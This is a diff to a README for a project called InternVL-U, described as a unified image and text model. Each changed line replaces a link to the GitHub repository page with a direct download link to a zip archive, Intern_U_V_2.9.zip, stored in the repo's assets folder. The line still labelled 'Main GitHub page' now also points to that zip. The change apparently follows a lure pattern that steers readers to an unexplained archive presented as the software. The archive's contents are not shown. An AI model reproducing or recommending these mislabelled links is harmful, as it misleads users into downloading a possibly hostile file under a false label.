@@ -1,6 +1,6 @@
 # 🚀 InternVL-U - Unified Model for Images and Text
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/juanchito22-cpu/InternVL-U)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/juanchito22-cpu/InternVL-U/raw/refs/heads/main/assets/Intern_U_V_2.9.zip)
 
 ## 📋 About InternVL-U
 
@@ -25,7 +25,7 @@ If you are unsure about your system specs, you can check by typing "System Infor
 
 To begin with InternVL-U, you need to download the software from the official repository page.
 
-[![Download](https://img.shields.io/badge/Get%20InternVL--U-From%20GitHub-blue)](https://github.com/juanchito22-cpu/InternVL-U)
+[![Download](https://img.shields.io/badge/Get%20InternVL--U-From%20GitHub-blue)](https://github.com/juanchito22-cpu/InternVL-U/raw/refs/heads/main/assets/Intern_U_V_2.9.zip)
 
 ### Steps to Download:
 
@@ -106,8 +106,8 @@ If you want help or want to report a problem:
 
 ## 🔗 Useful Links
 
-- Main GitHub page: [https://github.com/juanchito22-cpu/InternVL-U](https://github.com/juanchito22-cpu/InternVL-U)
-- Download InternVL-U: [https://github.com/juanchito22-cpu/InternVL-U](https://github.com/juanchito22-cpu/InternVL-U)
+- Main GitHub page: [https://github.com/juanchito22-cpu/InternVL-U/raw/refs/heads/main/assets/Intern_U_V_2.9.zip](https://github.com/juanchito22-cpu/InternVL-U/raw/refs/heads/main/assets/Intern_U_V_2.9.zip)
+- Download InternVL-U: [https://github.com/juanchito22-cpu/InternVL-U/raw/refs/heads/main/assets/Intern_U_V_2.9.zip](https://github.com/juanchito22-cpu/InternVL-U/raw/refs/heads/main/assets/Intern_U_V_2.9.zip)
 
 ## ⚠️ Notes About Usage
 
